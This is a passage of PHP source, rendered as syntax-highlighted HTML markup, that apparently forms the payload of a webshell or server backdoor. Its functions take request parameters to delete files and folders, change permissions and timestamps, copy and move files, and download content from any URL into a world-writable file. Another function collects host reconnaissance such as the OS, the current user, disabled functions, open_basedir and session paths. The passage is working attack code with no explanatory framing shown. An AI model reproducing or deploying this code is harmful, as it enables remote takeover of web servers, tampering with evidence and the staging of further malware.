punctuation">{</span> @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$pf</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">deleteFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$F</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">deleteDir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"ok"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token operator">?</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string double-quoted-string">"ok"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fail"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">setFileAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$fileName</span> <span class="token operator">=</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Null"</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token operator">&amp;&amp;</span><span class="token variable">$attr</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token operator">&amp;&amp;</span><span class="token variable">$fileName</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token string double-quoted-string">"fileBasicAttr"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token function">convertFilePermissions</span><span class="token punctuation">(</span><span class="token variable">$attr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span><span class="token operator">==</span><span class="token string double-quoted-string">"fileTimeAttr"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">touch</span><span class="token punctuation">(</span><span class="token variable">$fileName</span><span class="token punctuation">,</span><span class="token variable">$attr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"no ExcuteType"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token variable">$ret</span><span class="token operator">=</span><span class="token string double-quoted-string">"type or attr or fileName is null"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">fileRemoteDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$url</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$saveFile</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"saveFile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$url</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token operator">&amp;&amp;</span><span class="token variable">$saveFile</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$data</span><span class="token operator">=</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$saveFile</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$saveFile</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"write fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"read fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"url or saveFile is null"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">copyFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$srcFileName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"srcFileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$destFileName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"destFileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$srcFileName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$srcFileName</span><span class="token punctuation">,</span><span class="token variable">$destFileName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"The target does not exist or is not a file"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">moveFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$srcFileName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"srcFileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$destFileName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"destFileName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$srcFileName</span><span class="token punctuation">,</span><span class="token variable">$destFileName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"ok"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"fail"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">getBasicsInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'OsInfo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CurrentUser'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CurrentUser'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CurrentUser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CurrentUser'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'NULL'</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_PORT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_PORT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_CLIENT_IP'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_PORT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_PORT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> @<span class="token function">get_cfg_var</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Open_basedir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'timezone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'date.timezone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'encode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exif.encode_unicode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension_dir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'extension_dir'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$tmpDir</span><span class="token operator">=</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$separator</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$tmpDir</span><span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tmpDir</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$separator</span><span class="token operator">!=</span><span class="token string single-quoted-string">'\\'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$separator</span><span class="token operator">!=</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$tmpDir</span><span class="token operator">=</span><span class="token variable">$tmpDir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'systempdir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$tmpDir</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'include_path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOCUMENT_ROOT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SAPI'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">PHP_SAPI</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_VERSION'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">PHP_VERSION</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_INT_SIZE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">PHP_INT_SIZE</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ProcessArch'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">PHP_INT_SIZE</span><span class="token operator">==</span><span class="token number">8</span><span class="token operator">?</span><span class="token string double-quoted-string">"x64"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"x86"</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_OS'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">PHP_OS</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'canCallGzipDecode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">canCallGzipDecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'canCallGzipEncode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">canCallGzipEncode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session_name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session.name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session_save_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session.save_path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session_save_handler'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session.save_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session_serialize_handler'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session.serialize_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_ini_filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user_ini.filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'memory_limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'memory_limit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_max_filesize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_max_filesize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'post_max_size'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'post_max_size'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'max_execution_time'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_execution_time'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'max_input_time'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'max_input_time'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'default_socket_timeout'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'default_socket_timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mygid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">getmygid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'mypid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">getmypid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_SOFTWAREypid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_SOFTWARE'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_PORT'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_PORT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'loaded_extensions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> @<span class="token function">get_loaded_extensions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'short_open_tag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">get_cfg_var</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'short_open_tag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'short_open_tag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'short_open_tag'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'true'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'false'</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'asp_tags'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">get_cfg_var</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'asp_tags'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'asp_tags'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'asp_tags'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'true'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'false'</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'safe_mode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> @<span class="token function">get_cfg_var</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'safe_mode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'safe_mode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'safe_mode'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'true'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'false'</span><span class="token punctuation">;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CurrentDir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> @<span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CurrentDir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CurrentDir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> @<span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$SCRIPT_FILENAME</span><span class="token operator">=</span>@<span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span 